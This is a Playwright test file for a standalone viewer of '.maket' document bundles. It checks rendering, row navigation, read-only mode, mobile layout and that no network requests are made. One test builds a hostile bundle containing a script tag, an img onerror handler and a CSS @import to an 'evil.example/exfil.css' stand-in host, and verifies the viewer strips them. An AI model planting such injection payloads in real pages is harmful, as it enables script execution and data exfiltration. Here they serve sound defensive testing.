import path from "node:path";
import { fileURLToPath } from "node:url";
import { expect, test } from "@playwright/test";
import JSZip from "jszip";

// Acceptance tests for the standalone viewer (/viewer.html): a .maket bundle
// opens fully client-side — documents render with their charte, assets load
// from object URLs, collection variants navigate — with zero editor UI.

const FIXTURE = path.join(
	path.dirname(fileURLToPath(import.meta.url)),
	"fixtures",
	"viewer-sample.maket",
);

async function openFixture(page: import("@playwright/test").Page) {
	await page.goto("/viewer.html");
	await page.setInputFiles('input[type="file"]', FIXTURE);
	await expect(page.locator('[data-doc="poster"]')).toBeVisible();
}

test.describe("Maket Viewer", () => {
	test("serves the drop zone with the local-only promise", async ({ page }) => {
		const response = await page.goto("/viewer.html");
		expect(response?.status()).toBe(200);
		await expect(page).toHaveTitle(/Maket Viewer/i);
		await expect(
			page.getByRole("button", { name: /choose a file/i }),
		).toBeVisible();
		await expect(page.getByText(/nothing is uploaded/i)).toBeVisible();
	});

	test("rejects a non-maket file with a clear error", async ({ page }) => {
		await page.goto("/viewer.html");
		await page.setInputFiles('input[type="file"]', {
			name: "bogus.maket",
			mimeType: "application/octet-stream",
			buffer: Buffer.from("not a bundle"),
		});
		await expect(page.getByText(/invalid \.maket file/i)).toBeVisible();
	});

	test("opens a bundle: documents, charte and assets render", async ({
		page,
	}) => {
		await openFixture(page);

		// Both documents from the bundle are on the board.
		await expect(page.locator('[data-doc="poster"]')).toBeVisible();
		await expect(page.locator('[data-doc="labels"]')).toBeVisible();

		// Page content renders with the charte variable applied.
		const title = page.locator('[data-id="e1"]', {
			hasText: "Grand Cru Smoked Salmon",
		});
		await expect(title).toBeVisible();
		await expect(title).toHaveCSS("color", "rgb(179, 84, 42)");

		// The bundled asset is served from an object URL, not the server.
		const logo = page.locator('img[data-name="logo"]');
		await expect(logo).toHaveAttribute("src", /^blob:/);
		// And it actually decoded (naturalWidth > 0).
		await expect
			.poll(() => logo.evaluate((el) => (el as HTMLImageElement).naturalWidth))
			.toBeGreaterThan(0);

		await expect(
			page.getByText("viewer-sample.maket", { exact: false }),
		).toBeVisible();
	});

	test("collection variants render and navigate rows", async ({ page }) => {
		await openFixture(page);
		const labelsDoc = page.locator('[data-doc="labels"]');

		// Collection controls only show on the focused doc — focus labels first.
		await labelsDoc.locator(".doc-label-name").click();

		// Template mode shows the raw placeholder.
		const canvas = labelsDoc.locator(".page-canvas");
		await expect(canvas.getByText("{{ name }}")).toBeVisible();

		// Switch to rendered mode → first member's data appears.
		await labelsDoc.getByRole("button", { name: "Current row render" }).click();
		await expect(canvas.getByText("Salmon Classic")).toBeVisible();
		await expect(canvas.getByText("12€")).toBeVisible();

		// Navigate to the next row.
		await labelsDoc.getByRole("button", { name: "Next row" }).click();
		await expect(canvas.getByText("Trout Fillet")).toBeVisible();

		// "All rows" fans out every member.
		await labelsDoc.getByRole("button", { name: "All rows" }).click();
		await expect(canvas.getByText("Salmon Classic")).toBeVisible();
		await expect(canvas.getByText("Trout Fillet")).toBeVisible();
		await expect(canvas.getByText("Herring Dill")).toBeVisible();
	});

	test("read-only: clicking an element shows no edit toolbar", async ({
		page,
	}) => {
		await openFixture(page);
		await page
			.locator('[data-doc="poster"] [data-id="e1"]')
			.click({ force: true });
		await expect(page.locator(".element-toolbar")).toHaveCount(0);
	});

	test("read-only: collection data grid is not reachable", async ({ page }) => {
		await openFixture(page);
		const labelsDoc = page.locator('[data-doc="labels"]');
		await labelsDoc.locator(".doc-label-name").click();
		// Mode buttons are there…
		await expect(
			labelsDoc.getByRole("button", { name: "Current row render" }),
		).toBeVisible();
		// …but the editable data grid entry point is not.
		await expect(
			labelsDoc.getByRole("button", { name: "Open data" }),
		).toHaveCount(0);
	});

	test("strips active HTML and untrusted font imports from a hostile bundle", async ({
		page,
	}) => {
		const zip = new JSZip();
		zip.file(
			"manifest.json",
			JSON.stringify({
				version: 2,
				kind: "maket-bundle",
				exportedAt: "2026-01-01T00:00:00.000Z",
				documents: [
					{
						name: "evil",
						category: "general",
						canvas: { w: 100, h: 100, background: "#ffffff" },
						meta: { charte: "evil-charte" },
						pages: [
							{
								id: "p1",
								name: "P",
								elements: [],
								html:
									"<script>window.__pwned = 1;</script>" +
									'<img src="x" onerror="window.__pwned = 2" alt="" />' +
									'<div data-id="e1">Safe content</div>',
							},
						],
					},
				],
				chartes: [
					{
						name: "evil-charte",
						css: "@import url('https://evil.example/exfil.css');\n:root { --charte-color-bg: #fff; }",
					},
				],
				collections: [],
			}),
		);
		const buffer = await zip.generateAsync({ type: "nodebuffer" });

		const evilRequests: string[] = [];
		page.on("request", (request) => {
			if (request.url().includes("evil.example")) {
				evilRequests.push(request.url());
			}
		});

		await page.goto("/viewer.html");
		await page.setInputFiles('input[type="file"]', {
			name: "evil.maket",
			mimeType: "application/zip",
			buffer,
		});

		const canvas = page.locator('[data-doc="evil"] .page-canvas');
		await expect(canvas.getByText("Safe content")).toBeVisible();
		// Script tags are removed, event handlers scrubbed.
		await expect(canvas.locator("script")).toHaveCount(0);
		await expect(canvas.locator("img")).not.toHaveAttribute("onerror", /./);
		await expect
			.poll(() => page.evaluate(() => (window as any).__pwned))
			.toBeUndefined();
		// The untrusted @import never became a stylesheet link.
		await expect(
			page.locator('link[data-charte-font][href*="evil.example"]'),
		).toHaveCount(0);
		expect(evilRequests).toEqual([]);
	});

	test("renders every page of a multi-page document", async ({ page }) => {
		await openFixture(page);
		const brochure = page.locator('[data-doc="brochure"]');
		await expect(brochure.locator(".page-canvas")).toHaveCount(3);
		await expect(brochure.getByText("Our Smokehouse")).toBeVisible();
		await expect(
			brochure.getByText("Since 1987, slow oak smoke."),
		).toBeVisible();
		await expect(brochure.getByText("Visit us in Bergen.")).toBeVisible();
		// Per-page labels appear on multi-page docs.
		await expect(brochure.getByText("Cover")).toBeVisible();
	});

	test("mobile: board auto-fits and viewer bar stays usable", async ({
		page,
	}) => {
		await page.setViewportSize({ width: 375, height: 812 });
		await openFixture(page);
		// The initial fit must bring the whole workspace into the viewport.
		const box = await page
			.locator('[data-doc="poster"] .page-canvas')
			.boundingBox();
		expect(box).not.toBeNull();
		if (box) {
			expect(box.x).toBeGreaterThanOrEqual(-1);
			expect(box.x + box.width).toBeLessThanOrEqual(376);
			expect(box.y).toBeGreaterThanOrEqual(-1);
		}
		await expect(page.getByText("Maket Viewer")).toBeVisible();
	});

	test("makes no network requests after the bundle is opened", async ({
		page,
	}) => {
		await openFixture(page);
		await page.locator('[data-doc="labels"] .doc-label-name').click();
		const requests: string[] = [];
		page.on("request", (request) => {
			if (request.url().startsWith("blob:")) return;
			requests.push(request.url());
		});
		await page
			.locator('[data-doc="labels"]')
			.getByRole("button", { name: "Current row render" })
			.click();
		await expect(
			page
				.locator('[data-doc="labels"] .page-canvas')
				.getByText("Salmon Classic"),
		).toBeVisible();
		expect(requests).toEqual([]);
	});
});
